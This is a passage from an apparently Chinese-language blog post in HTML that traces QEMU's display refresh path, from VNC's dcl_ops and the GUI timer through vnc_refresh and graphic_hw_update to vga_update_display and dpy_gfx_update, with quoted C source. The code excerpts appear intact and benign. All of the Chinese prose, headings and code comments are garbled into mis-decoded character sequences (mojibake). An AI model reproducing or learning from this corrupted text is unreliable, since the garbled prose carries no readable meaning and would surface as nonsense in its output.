ä¸Šå–ä¸‹è¯¥ job å¹¶é‡Šæ”¾</li></ul><h3 id="IIã€VNC-çš„-dcl-ops">IIã€VNC çš„ dcl_ops</h3><p>åœ¨ <code>vnc_display_init()</code> ä¸­åˆ›å»º VncDisplay å®ä¾‹æ—¶ä¼šå°†å…¶ DisplayChangeListener çš„å‡½æ•°è¡¨åˆå§‹åŒ–ä¸º <code>dcl_ops</code> å‡½æ•°è¡¨ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> DisplayChangeListenerOps dcl_ops = &#123;<br>    .dpy_name             = <span class="hljs-string">&quot;vnc&quot;</span>,<br>    .dpy_refresh          = vnc_refresh,<br>    .dpy_gfx_update       = vnc_dpy_update,<br>    .dpy_gfx_switch       = vnc_dpy_switch,<br>    .dpy_gfx_check_format = qemu_pixman_check_format,<br>    .dpy_mouse_set        = vnc_mouse_set,<br>    .dpy_cursor_define    = vnc_dpy_cursor_define,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸­ä¸»è¦éƒ½æ˜¯ä¸ vnc ç›¸å…³çš„æ“ä½œå‡½æ•°ï¼Œåé¢æ¶‰åŠåˆ°å…·ä½“å‡½æ•°æ—¶æˆ‘ä»¬å†å±•å¼€åˆ†æ</p><h3 id="IIIã€register-displaychangelistener-æ³¨å†Œ-dclï¼Œå¯åŠ¨-timer">IIIã€register_displaychangelistener - æ³¨å†Œ dclï¼Œå¯åŠ¨ timer</h3><p>è¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_displaychangelistener</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    QemuConsole *con;<br><br>    assert(!dcl-&gt;ds);<br><br>    trace_displaychangelistener_register(dcl, dcl-&gt;ops-&gt;dpy_name);<br>    dcl-&gt;ds = get_alloc_displaystate();<br>    QLIST_INSERT_HEAD(&amp;dcl-&gt;ds-&gt;listeners, dcl, next);<br>    gui_setup_refresh(dcl-&gt;ds);<br>    <span class="hljs-keyword">if</span> (dcl-&gt;con) &#123;<br>        dcl-&gt;con-&gt;dcls++;<br>        con = dcl-&gt;con;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        con = active_console;<br>    &#125;<br>    displaychangelistener_display_console(dcl, con, dcl-&gt;con ? &amp;error_fatal : <span class="hljs-literal">NULL</span>);<br>    text_console_update_cursor(<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦åšäº†è¿™äº›äº‹æƒ…ï¼š</p><ul><li>å°† dcl æ’åˆ°å¯¹åº” DisplayState çš„ listeners é“¾è¡¨ä¸Š</li><li>è°ƒç”¨ <code>gui_setup_refresh()</code> å¯åŠ¨ä¸€ä¸ª Qemu Timer</li><li>è°ƒç”¨ <code>displaychangelistener_display_console()</code> è¿›è¡Œç›¸å…³åˆå§‹åŒ–æ“ä½œï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>dcl-&gt;ops</code> ä¸­å‡½æ•°</li></ul><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ <code>gui_setup_refresh()</code>ï¼Œå…¶ä¼šå¯åŠ¨ä¸€ä¸ª Qemu å®šæ—¶å™¨ï¼Œå®šæœŸåœ°åˆ·æ–° frame bufferï¼Œè¿™ä¹Ÿæ˜¯æ›´æ–°æ˜¾å¡æ•°æ®çš„æ ¸å¿ƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_setup_refresh</span><span class="hljs-params">(DisplayState *ds)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">bool</span> need_timer = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_gfx = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_text = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh != <span class="hljs-literal">NULL</span>) &#123;<br>            need_timer = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_gfx = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_text_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_text = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (need_timer &amp;&amp; ds-&gt;gui_timer == <span class="hljs-literal">NULL</span>) &#123;<br>        ds-&gt;gui_timer = timer_new_ms(QEMU_CLOCK_REALTIME, gui_update, ds);<br>        timer_mod(ds-&gt;gui_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!need_timer &amp;&amp; ds-&gt;gui_timer != <span class="hljs-literal">NULL</span>) &#123;<br>        timer_free(ds-&gt;gui_timer);<br>        ds-&gt;gui_timer = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    ds-&gt;have_gfx = have_gfx;<br>    ds-&gt;have_text = have_text;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ dcl-&gt;ops çš„ <code>dpy_refresh</code> æŒ‡é’ˆéç©º<strong>ä¸”å½“å‰ DisplayState æœªè®¾ç½® timer æ—¶</strong>ï¼Œä¾¿ä¼šè°ƒç”¨ <code>timer_new_ms()</code> æ–°å»ºä¸€ä¸ªæ¯«ç§’çº§åˆ«çš„å®šæ—¶å™¨ï¼Œå®šæ—¶è°ƒç”¨ <code>gui_update()</code> åˆ·æ–°æ˜¾å­˜ï¼Œæ¥æ”¶çš„å‚æ•°ä¾¿ä¸ºè¯¥ DisplayState</p><h1>0x03.æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°</h1><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œåœ¨ Qemu å¯åŠ¨æ—¶ä¼šå¯åŠ¨ä¸€ä¸ª Timer å®šæ—¶è¿›è¡Œæ˜¾å­˜çš„åˆ·æ–°ï¼Œå…¶ä»£ç è°ƒç”¨å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p><h2 id="ä¸€ã€gui-update-timer-å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ">ä¸€ã€gui_update - timer å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>gui_update()</code> è¿™ä¸ªç”± timer å®šæ—¶è°ƒç”¨çš„å‡½æ•°ï¼Œå…¶å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_update</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> interval = GUI_REFRESH_INTERVAL_IDLE;<br>    <span class="hljs-type">uint64_t</span> dcl_interval;<br>    DisplayState *ds = opaque;<br>    DisplayChangeListener *dcl;<br>    QemuConsole *con;<br><br>    ds-&gt;refreshing = <span class="hljs-literal">true</span>;<br>    dpy_refresh(ds);<br>    ds-&gt;refreshing = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        dcl_interval = dcl-&gt;update_interval ?<br>            dcl-&gt;update_interval : GUI_REFRESH_INTERVAL_DEFAULT;<br>        <span class="hljs-keyword">if</span> (interval &gt; dcl_interval) &#123;<br>            interval = dcl_interval;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ds-&gt;update_interval != interval) &#123;<br>        ds-&gt;update_interval = interval;<br>        QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>            <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;update_interval) &#123;<br>                con-&gt;hw_ops-&gt;update_interval(con-&gt;hw, interval);<br>            &#125;<br>        &#125;<br>        trace_console_refresh(interval);<br>    &#125;<br>    ds-&gt;last_update = qemu_clock_get_ms(QEMU_CLOCK_REALTIME);<br>    timer_mod(ds-&gt;gui_timer, ds-&gt;last_update + interval);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è°ƒç”¨ <code>dpy_refresh()</code> ï¼Œè¯¥å‡½æ•°ä¼šéå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListener å¹¶è°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_refresh()</code></li><li>éå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListenerï¼Œæ£€æŸ¥ <code>dcl-&gt;update_interval</code></li><li>è‹¥ <code>ds-&gt;update_interval != interval</code>ï¼Œéå†æ‰€æœ‰çš„ QemuConsole å¹¶è°ƒç”¨ <code>con-&gt;hw_ops-&gt;update_interval()</code> è¿›è¡Œç¡¬ä»¶æ•°æ®æ›´æ–°</li></ul><h2 id="äºŒã€dpy-refresh-éå†-dcl-å¹¶è°ƒç”¨-dcl-ops-dpy-refresh-è¿›è¡Œæ›´æ–°">äºŒã€dpy_refresh - éå† dcl å¹¶è°ƒç”¨ dcl-&gt;ops-&gt;dpy_refresh è¿›è¡Œæ›´æ–°</h2><p><code>dpy_refresh()</code> æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯éå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListener å¹¶è°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_refresh()</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dpy_refresh</span><span class="hljs-params">(DisplayState *s)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br><br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh) &#123;<br>            dcl-&gt;ops-&gt;dpy_refresh(dcl);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸ VNC æœ‰å…³çš„éƒ¨åˆ†ï¼Œå¯¹äº VNC è€Œè¨€ï¼Œå…¶ <code>dcl-&gt;ops-&gt;dpy_refresh</code> åº”ä¸º <code>vnc_refresh</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_refresh</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    VncState *vs, *vn;<br>    <span class="hljs-type">int</span> has_dirty, rects = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (QTAILQ_EMPTY(&amp;vd-&gt;clients)) &#123;   <span class="hljs-comment">// æ²¡æœ‰ clientï¼Œç›´æ¥è¿”å›</span><br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_MAX);   <span class="hljs-comment">//æ›´æ–°è®¡æ—¶</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    graphic_hw_update(vd-&gt;dcl.con); <span class="hljs-comment">// ç¡¬ä»¶æ›´æ–°</span><br><br>    <span class="hljs-keyword">if</span> (vnc_trylock_display(vd)) &#123;<br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_BASE);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    has_dirty = vnc_refresh_server_surface(vd); <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¾…æ›´æ–°æ•°æ®</span><br>    vnc_unlock_display(vd);<br><br>    QTAILQ_FOREACH_SAFE(vs, &amp;vd-&gt;clients, next, vn) &#123;<br>        rects += vnc_update_client(vs, has_dirty);  <span class="hljs-comment">// éå†æ›´æ–° client</span><br>        <span class="hljs-comment">/* vs might be free()ed here */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (has_dirty &amp;&amp; rects) &#123;<br>        vd-&gt;dcl.update_interval /= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &lt; VNC_REFRESH_INTERVAL_BASE) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_BASE;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;dcl.update_interval += VNC_REFRESH_INTERVAL_INC;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &gt; VNC_REFRESH_INTERVAL_MAX) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_MAX;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œè‹¥å¦åˆ™æ›´æ–°è®¡æ—¶åç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>graphic_hw_update()</code> æ›´æ–° dcl å¯¹åº”çš„ QemuConsole å¯¹åº”çš„ç¡¬ä»¶è®¾å¤‡</li><li>è°ƒç”¨ <code>vnc_refresh_server_surface()</code> æ£€æŸ¥æ˜¯å¦æœ‰ dirty åŒºåŸŸï¼ˆå¾…æ›´æ–°åŒºåŸŸï¼‰</li><li>éå† dcl ä¸Šçš„ clientï¼Œ è°ƒç”¨ <code>vnc_update_client()</code> åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Šï¼Œç”± worker thread è¿›è¡Œæ¨é€</li></ul><h2 id="ä¸‰ã€graphic-hw-update-å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°">ä¸‰ã€graphic_hw_update - å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°</h2><p>å‰é¢æˆ‘ä»¬æ¶‰åŠåˆ°çš„éƒ½æ˜¯ consoleã€vnc è¿™ä¸€å—çš„æ•°æ®æ›´æ–°ï¼Œå¹¶æ²¡æœ‰è§¦åŠåˆ°å®é™…çš„ç¡¬ä»¶æ–¹é¢ï¼ˆqemu æ¨¡æ‹Ÿæ˜¾å¡ç­‰ï¼‰çš„æ›´æ–°ï¼Œè¿™ä¸€å—å®é™…çš„æ›´æ–°æ˜¯ç”± <code>graphic_hw_update()</code> æ¥å®Œæˆçš„ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">graphic_hw_update</span><span class="hljs-params">(QemuConsole *con)</span><br>&#123;<br>    <span class="hljs-type">bool</span> async = <span class="hljs-literal">false</span>;<br>    con = con ? con : active_console;<br>    <span class="hljs-keyword">if</span> (!con) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;gfx_update) &#123;<br>        con-&gt;hw_ops-&gt;gfx_update(con-&gt;hw);<br>        async = con-&gt;hw_ops-&gt;gfx_update_async;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!async) &#123;<br>        graphic_hw_update_done(con);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä¸€ä¸ª QemuConsole å¯¹åº”ä¸€ä¸ªæ˜¾ç¤ºè®¾å¤‡ï¼Œå› æ­¤åœ¨ <code>graphic_hw_update()</code> å½“ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>con-&gt;hw_ops-&gt;gfx_update()</code> æ¥å®Œæˆç¡¬ä»¶æ–¹é¢çš„æ•°æ®æ›´æ–°</p><p>å¦‚æœæ˜¯çº¯å­—ç¬¦å‹æ˜¾ç¤ºè®¾å¤‡ï¼Œåˆ™ä¸º <code>text_console_ops</code>ï¼Œå®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œè¯¥å‡½æ•°è¡¨æ²¡æœ‰ <code>gfx_update</code> æŒ‡é’ˆï¼Œæ•…ä¼šç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps text_console_ops = &#123;<br>    .invalidate  = text_console_invalidate,<br>    .text_update = text_console_update,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºé»˜è®¤çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œ<code>con-&gt;hw-&gt;ops</code> åº”ä¸º <code>vga_ops</code>ï¼Œå®šä¹‰äº <code>hw/display/vga.c</code> ä¸­ï¼Œå…¶ <code>gfx_update</code> æŒ‡é’ˆä¸º <code>vga_update_display</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps vga_ops = &#123;<br>    .invalidate  = vga_invalidate_display,<br>    .gfx_update  = vga_update_display,<br>    .text_update = vga_update_text,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸»è¦æ˜¯æ ¹æ®æŒ‡å®šçš„ç¡¬ä»¶å†³å®šçš„ï¼Œé»˜è®¤çš„å›¾å½¢ç•Œé¢ä¾¿æ˜¯ <code>vga_ops</code>ï¼Œå¦‚æœä½ åœ¨å¯åŠ¨æ—¶æŒ‡å®šäº†ä¸€ä¸ª QXL æ˜¾å¡ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥æ˜¯ <code>qxl_ops</code>ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° <code>qxl_hw_update()</code></p></blockquote><p>è¯¥å‡½æ•°å®šä¹‰äº <code>hw/display/vga.c</code> ä¸­ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯æ ¹æ®æ˜¾ç¤ºæ¨¡å¼è°ƒç”¨ä¸åŒçš„æ›´æ–°å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vga_update_display</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    VGACommonState *s = opaque;<br>    DisplaySurface *surface = qemu_console_surface(s-&gt;con);<br>    <span class="hljs-type">int</span> full_update, graphic_mode;<br><br>    qemu_flush_coalesced_mmio_buffer();<br><br>    <span class="hljs-keyword">if</span> (surface_bits_per_pixel(surface) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* nothing to do */</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        full_update = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (!(s-&gt;ar_index &amp; <span class="hljs-number">0x20</span>)) &#123;<br>            graphic_mode = GMODE_BLANK;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            graphic_mode = s-&gt;gr[VGA_GFX_MISC] &amp; VGA_GR06_GRAPHICS_MODE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (graphic_mode != s-&gt;graphic_mode) &#123;<br>            s-&gt;graphic_mode = graphic_mode;<br>            s-&gt;cursor_blink_time = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);<br>            full_update = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">switch</span>(graphic_mode) &#123;<br>        <span class="hljs-keyword">case</span> GMODE_TEXT:<br>            vga_draw_text(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_GRAPH:<br>            vga_draw_graphic(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_BLANK:<br>        <span class="hljs-keyword">default</span>:<br>            vga_draw_blank(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™äº› <code>vga_draw_*</code> å‡½æ•°æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>dpy_gfx_update()</code> å°†æ›´æ–°æ¨é€åˆ°æ˜¾ç¤ºè®¾å¤‡ä¸Šï¼Œå…¶å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">dpy_gfx_update</span><span class="hljs-params">(QemuConsole *con, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    DisplayState *s = con-&gt;ds;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">int</span> width = qemu_console_get_width(con, x + w);<br>    <span class="hljs-type">int</span> height = qemu_console_get_height(con, y + h);<br><br>    x = MAX(x, <span class="hljs-number">0</span>);<br>    y = MAX(y, <span class="hljs-number">0</span>);<br>    x = MIN(x, width);<br>    y = MIN(y, height);<br>    w = MIN(w, width - x);<br>    h = MIN(h, height - y);<br><br>    <span class="hljs-keyword">if</span> (!qemu_console_is_visible(con)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    dpy_gfx_update_texture(con, con-&gt;surface, x, y, w, h);<br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (con != (dcl-&gt;con ? dcl-&gt;con : active_console)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update) &#123;<br>            dcl-&gt;ops-&gt;dpy_gfx_update(dcl, x, y, w, h);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥ QemuConsole ä¸å¯è§†ï¼Œç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>dpy_gfx_update_texture()</code>ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>con-&gt;gl-&gt;ops-&gt;dpy_gl_ctx_update_texture()</code>ï¼Œè¿™ä¸€å—æ˜¯ä¸ GL ç›¸å…³çš„æ“ä½œï¼Œè¿™é‡Œæš‚ä¸”ä¸å±•å¼€</li><li>éå† QemuConsole ä¸Šçš„ DisplayChangeListenerï¼Œè°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_gfx_update()</code>ï¼Œæ›´æ–° dcl å¯¹åº”çš„ display è®¾å¤‡</li></ul><p>å¯¹äº VNC è€Œè¨€ï¼Œ<code>dcl-&gt;ops-&gt;dpy_gfx_update</code> æŒ‡é’ˆåº”ä¸º <code>vnc_dpy_update()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨ <code>vnc_set_area_dirty()</code> å°†ä¸€å—åŒºåŸŸæ ‡è®°ä¸º dirtyï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 